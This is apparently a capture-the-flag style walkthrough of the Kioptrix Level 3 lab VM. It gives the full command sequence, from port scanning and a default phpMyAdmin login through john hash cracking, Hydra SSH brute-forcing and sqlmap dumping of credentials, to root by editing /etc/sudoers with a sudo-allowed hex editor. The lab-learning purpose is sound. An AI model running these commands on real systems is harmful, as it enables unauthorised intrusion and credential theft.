# Enumeration
## TCP Ports enumeration
nmap -sS -T4 -p- -A 192.168.1.11

![image](https://user-images.githubusercontent.com/24206178/154663783-71b0e05a-9891-4f04-87fa-653c8af2a30a.png)


Intersting:

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)

80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

OS details: Linux 2.6.9 - 2.6.33

#SSH service and a webserver are running

So we will go after those two!!

##  Web server

nikto -h 192.168.1.11

![image](https://user-images.githubusercontent.com/24206178/154663970-d618a8ea-c291-4080-ae3d-b0b7df69c48b.png)

/phpmyadmin/: phpMyAdmin directory found

curl --head 192.168.1.11

![image](https://user-images.githubusercontent.com/24206178/154663996-16ea3849-7ad5-48c7-856f-0175f6a9eb78.png)

 let’s try some default username/password on the phpmyadmin
 
 “admin” with an empty password worked!
 Unfortunately, “admin” user has only access to information_schema and didn’t reveal any credentials we can use to get a shell through SSH.
 
 ![image](https://user-images.githubusercontent.com/24206178/154663936-b6e08080-75ad-4e73-9aed-c7c51203c3f9.png)
 
After poking through the site it seems to contain 2 components:

1- Ligoat Security blog
2- Gallery (Kioptrix3.com/gallery)

Important note:
Before trying out our webapp pentesting skills, it’s worth noting that we found a username in the second blogpost!

![image](https://user-images.githubusercontent.com/24206178/154664017-b20ab2ad-4d42-43d3-81c0-7a81e8b0fab9.png)

Welcome loneferret! and don't forget to fill in your time sheet.  

### LotusCMS

![image](https://user-images.githubusercontent.com/24206178/154664093-778d8904-3b24-4433-a431-482fb458b83a.png)

What is LotusCMS???

![image](https://user-images.githubusercontent.com/24206178/154664128-be935ed5-3e9f-4e19-8ac9-8822b3661dee.png)

![image](https://user-images.githubusercontent.com/24206178/154664175-2e99f2c6-e1d6-4534-9bb9-23bc984a3af2.png)

so we notic that the last version was in 14-03-2011
when the bloge wrote in 05 August 2010!!

lets dig a little bit more
Open metasploit and search

>msfconsole
>search LotusCMS

![image](https://user-images.githubusercontent.com/24206178/154664276-c551e260-540c-4068-80cd-47157bb881a9.png)

# Exploit

Trying to know the type of the hash

hashid 5badcaf789d3d1d09794d8f021f40f0e

![image](https://user-images.githubusercontent.com/24206178/154664430-ff16b3fa-9bd4-40c4-b634-374e4c6d6412.png)

perfect! lets say it is MD5 as it was in the top

Now, Create a file hashes.txt and copy these hashes to the file
then use john the wripper

>john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes.txt

IMPORTANT NOTE!!

if the password already cracked before it will not show up
so you write this command

john --show --format=raw-md5 hashes.txt

![image](https://user-images.githubusercontent.com/24206178/154664505-eef36c9d-d245-4fb6-8fd5-81b027f0baf5.png)

Thats perfect!
now we have the usernames and passwords to use to login using ssh

#### Method 2

We already know the user exists via a blog post mentioned earlier.

Using Hydra

hydra -e nsr -l loneferret -P Desktop/Passwords/xato-net-10-million-passwords-10000.txt 192.168.1.11 ssh -t 4

![image](https://user-images.githubusercontent.com/24206178/154664585-15b04ce2-b5cb-428d-8915-9f2f1d10eeca.png)

Thats perfect!
now we have the usernames and passwords to use to login using ssh

### Method 3: SQL injection through Gallery

We tried and this specific sql injection is working
http://192.168.1.11/gallery/gallery.php?id=1

Using sqlmap

sqlmap -u "http://192.168.1.11/gallery/gallery.php?id=1"


#now to see the databases

sqlmap -u "http://192.168.1.11/gallery/gallery.php?id=1" -dbs

![image](https://user-images.githubusercontent.com/24206178/154664690-e4a44779-94f5-46e7-95f8-08780b43dfaf.png)

#now to see the tables

sqlmap -u "http://192.168.1.11/gallery/gallery.php?id=1" --tables -D gallery

![image](https://user-images.githubusercontent.com/24206178/154664732-261b3c60-267b-4595-ba7f-90f90e502d6d.png)


##now to see the columns

sqlmap -u "http://192.168.1.11/gallery/gallery.php?id=1" --columns -D gallery -T dev_accounts

![image](https://user-images.githubusercontent.com/24206178/154664745-ecded11b-2286-490b-b75e-570410a2a31c.png)

#Now to see the data in the columns

sqlmap -u "http://192.168.1.11/gallery/gallery.php?id=1" --dumb -D gallery -T dev_accounts

![image](https://user-images.githubusercontent.com/24206178/154664773-16427dd8-f45c-4288-a0cf-085afad69a47.png)

Thats perfect!
now we have the usernames and passwords to use to login using ssh

# Privilege Escalation to root

ssh loneferret@192.168.1.11

![image](https://user-images.githubusercontent.com/24206178/154664939-8e16bfa7-ca85-4176-94ee-6769dc3c5750.png)

![image](https://user-images.githubusercontent.com/24206178/154664972-1069213c-cb1a-47fd-968f-e7f40317fa7c.png)

Now lets dig around

ls -

![image](https://user-images.githubusercontent.com/24206178/154664993-035f5161-b220-4434-894a-42087dd32735.png)

cat CompanyPolicy.README

![image](https://user-images.githubusercontent.com/24206178/154665009-8f55eee1-7fc6-42a4-b850-cd27cac12caf.png)

Please use the command 'sudo ht'    Intersting!

which ht

![image](https://user-images.githubusercontent.com/24206178/154665046-14242912-b5a7-462a-966e-12cad60ebd4b.png)

Now lets go find out what is that

cd /usr/local/bin/ht

ls -

![image](https://user-images.githubusercontent.com/24206178/154665078-b6a2e8a1-fa6e-4f48-8254-b85d43fed8d9.png)

Oh, so this file has setuid bit enabled, AND is owned by root

What’s the easiest file to edit and get root you ask?

It’s /etc/sudoers.

Be extremely careful while editing the sudoers file, saving it in bad format might break stuff and make you unable to use the su command. How do I know? Because I broke my VM, twice.

First, update the environment variable TERM.

   sudo /usr/local/bin/ht
   Error opening terminal: xterm-256color.
   export TERM=xterm
   ht /etc/sudoers
    
   ![image](https://user-images.githubusercontent.com/24206178/154665242-02d222c9-95b0-4f93-b59e-154fb7f5bf9c.png)

   ![image](https://user-images.githubusercontent.com/24206178/154665276-73c226d5-da85-42d4-92b3-759193d37a0d.png)
    
   F3
    
   ![image](https://user-images.githubusercontent.com/24206178/154665341-f00a4652-eeb1-41c9-afe0-4e4a88eb6cef.png)

    
   /etc/sudoers
    
   [Uploading image.png…]()

    
   Now let's do some hex patching. We want to change

   loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht
    
   TO
   loneferret ALL=(ALL) ALL  #/usr/bin/su, /usr/local/bin/ht
    
![image](https://user-images.githubusercontent.com/24206178/154665423-a23da9de-da81-44fd-bba8-a1d105e9066a.png)

F10

![image](https://user-images.githubusercontent.com/24206178/154665455-5bb47c99-45a9-45ac-96d5-90d18fe1e298.png)

![image](https://user-images.githubusercontent.com/24206178/154665475-3e08a5f7-cd15-4e13-83c2-f0abe49f693c.png)


sudo su -

![image](https://user-images.githubusercontent.com/24206178/154665482-e0cf52a5-1236-4d39-931f-5e34b2ebd072.png)

BINGO!
